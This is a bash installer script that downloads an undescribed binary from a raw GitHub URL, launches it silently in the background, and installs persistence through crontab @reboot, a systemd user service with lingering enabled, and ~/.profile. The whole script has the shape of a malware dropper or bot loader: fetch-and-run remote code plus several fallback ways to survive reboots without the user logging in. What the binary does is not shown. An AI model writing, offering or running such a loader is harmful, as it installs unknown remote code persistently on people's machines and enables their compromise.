#!/bin/bash
set -e

APP_NAME="n2client"
BINARY_URL="https://raw.githubusercontent.com/hellow2003/phpcode/main/client"
LOGFILE="/tmp/${APP_NAME}.log"

# Choose install directory based on root or normal user
if [ "$EUID" -eq 0 ]; then
    INSTALL_DIR="/usr/local/bin"
else
    INSTALL_DIR="$HOME/.${APP_NAME}"
fi

mkdir -p "$INSTALL_DIR"
BIN_PATH="$INSTALL_DIR/$APP_NAME"

echo "[*] Downloading binary..."
if command -v curl >/dev/null 2>&1; then
    curl -fsSL "$BINARY_URL" -o "$BIN_PATH"
elif command -v wget >/dev/null 2>&1; then
    wget -q "$BINARY_URL" -O "$BIN_PATH"
else
    echo "Error: Neither curl nor wget found. Install one and retry." >&2
    exit 1
fi

chmod +x "$BIN_PATH"

# Run immediately
echo "[*] Launching $APP_NAME now..."
nohup "$BIN_PATH" >> "$LOGFILE" 2>&1 &
disown

# ------------------------------------------------------------
# PERSISTENCE SETUP (tries multiple methods)
# ------------------------------------------------------------
register_persistence() {
    local BIN="$BIN_PATH"
    local LOG="$LOGFILE"

    # Method 1: crontab @reboot (works on most systems)
    if command -v crontab >/dev/null 2>&1; then
        # Remove any old entry, then add the new one
        (crontab -l 2>/dev/null | grep -v "$BIN"; echo "@reboot sleep 20 && $BIN >> $LOG 2>&1") | crontab -
        echo "[+] Persistence: crontab @reboot added (logs in $LOG)."
        return
    fi

    # Method 2: systemd user service (lingering enabled for boot-time start)
    if command -v systemctl >/dev/null 2>&1; then
        mkdir -p "$HOME/.config/systemd/user"
        cat > "$HOME/.config/systemd/user/${APP_NAME}.service" <<EOF
[Unit]
Description=$APP_NAME service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=$BIN
Restart=always
RestartSec=10
StandardOutput=append:$LOG
StandardError=append:$LOG

[Install]
WantedBy=default.target
EOF
        systemctl --user daemon-reload
        systemctl --user enable "${APP_NAME}.service"
        systemctl --user start "${APP_NAME}.service" 2>/dev/null || true

        # Enable lingering so the service starts at boot even without user login
        if command -v loginctl >/dev/null 2>&1; then
            loginctl enable-linger 2>/dev/null || true
        fi
        echo "[+] Persistence: systemd user service enabled (logs in $LOG)."
        return
    fi

    # Method 3: ~/.profile (login only, not boot)
    if [ -f "$HOME/.profile" ]; then
        if ! grep -qF "$BIN" "$HOME/.profile"; then
            echo "nohup $BIN >> $LOG 2>&1 &" >> "$HOME/.profile"
            echo "[!] Persistence added to ~/.profile (works only after login)."
        fi
        return
    fi

    echo "[!] No persistence method available. Binary will NOT survive reboot." >&2
}

register_persistence

echo "[✓] Setup complete. '$APP_NAME' is running and will survive reboots."
